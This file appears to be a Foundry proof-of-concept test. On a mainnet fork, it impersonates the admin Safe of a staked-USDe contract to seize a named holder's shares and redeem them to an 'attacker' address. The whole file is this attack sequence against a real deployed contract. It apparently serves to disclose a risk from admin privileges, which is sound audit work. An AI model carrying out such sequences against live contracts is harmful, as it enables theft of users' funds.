// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface Vm {
    function createSelectFork(string calldata url) external returns (uint256 forkId);
    function envOr(string calldata key, string calldata defaultValue) external returns (string memory value);
    function prank(address msgSender) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IStakedUSDeV2 {
    function grantRole(bytes32 role, address account) external;
    function redistributeLockedAmount(address from, address to) external;
    function setCooldownDuration(uint24 duration) external;
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function balanceOf(address account) external view returns (uint256);
    function previewRedeem(uint256 shares) external view returns (uint256);
    function asset() external view returns (address);
}

contract EthenaStakedUSDeV2PoC {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    address private constant TARGET = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;
    address private constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
    address private constant ADMIN_SAFE = 0x3B0AAf6e6fCd4a7cEEf8c92C32DFeA9E64dC1862;
    address private constant VICTIM = 0x9fFe77146Cc1DA3Edb87af163C6C32BAB474B464;
    address private constant ATTACKER = 0xDEad0000000000000000000000000000DeaDBEEF;
    bytes32 private constant FULL_RESTRICTED_STAKER_ROLE =
        keccak256("FULL_RESTRICTED_STAKER_ROLE");

    function setUp() public {
        string memory rethRpc = vm.envOr("RETH_RPC", "http://127.0.0.1:8545");
        string memory rpc = vm.envOr("MAINNET_RPC_URL", rethRpc);
        vm.createSelectFork(rpc);
    }

    function test_adminCanRedistributeAndRedeemRestrictedHolderShares() public {
        IStakedUSDeV2 susde = IStakedUSDeV2(TARGET);
        require(susde.asset() == USDE, "unexpected asset");

        uint256 victimShares = susde.balanceOf(VICTIM);
        require(victimShares > 0, "victim has no shares");
        uint256 previewAssets = susde.previewRedeem(victimShares);
        require(previewAssets > 0, "preview redeem is zero");

        uint256 attackerBefore = IERC20(USDE).balanceOf(ATTACKER);

        vm.prank(ADMIN_SAFE);
        susde.grantRole(FULL_RESTRICTED_STAKER_ROLE, VICTIM);

        vm.prank(ADMIN_SAFE);
        susde.redistributeLockedAmount(VICTIM, ADMIN_SAFE);

        vm.prank(ADMIN_SAFE);
        susde.setCooldownDuration(0);

        vm.prank(ADMIN_SAFE);
        susde.redeem(victimShares, ATTACKER, ADMIN_SAFE);

        uint256 attackerAfter = IERC20(USDE).balanceOf(ATTACKER);
        require(attackerAfter > attackerBefore, "attacker USDe did not increase");
        require(attackerAfter - attackerBefore >= previewAssets - 2, "redeem delta below preview");
    }
}
